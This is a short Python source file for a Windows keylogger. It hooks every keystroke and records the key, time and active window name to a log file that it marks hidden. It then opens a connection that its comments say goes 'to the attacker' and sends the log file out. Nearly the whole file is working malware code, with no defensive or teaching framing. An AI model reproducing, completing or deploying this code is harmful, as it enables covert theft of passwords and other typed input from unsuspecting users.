import pyWinhook, pythoncom, socket, os
import threading
from src import base64cipher
from src import newServer

# Variables for the process
filepath = "log.txt"


# Turn file to hidden
def hide():
    file = open(filepath, "w", encoding='utf-8')
    file.close()
    p = os.popen('attrib +h ' + filepath)
    t = p.read()
    p.close()


# Open connection to the attacker
def opensocket():
    openTunnel = newServer.transfer(filepath)
    return openTunnel


# Format the log file sent to the attacker
def onKeyDown(e):
    s = f"{e.GetKey()} \t {e.Time} \t {e.WindowName} \n"
    # c.send(s.encode())
    writeToFile(s)
    return 1


# Write the keys detected to the log file and encode
def writeToFile(s):
    file = open(filepath, "a", encoding='utf-8')
    msg = encodeTXT(s)
    file.write(s)


# Encode using base64 cipher
def encodeTXT(s):
    return base64cipher.encodeMsg(s)


# start the keylogger hack process
def start():
    hide()
    ot = opensocket()
    send_thread = threading.Thread(target=ot.send_file)
    send_thread.start()
    send(ot)
    hm = pyWinhook.HookManager()
    hm.HookKeyboard()
    hm.SubscribeKeyDown(onKeyDown)
    pythoncom.PumpMessages()


def send(ot):
    # something
    ot.send_file()


# Start tunnel
start()


#opensocket()
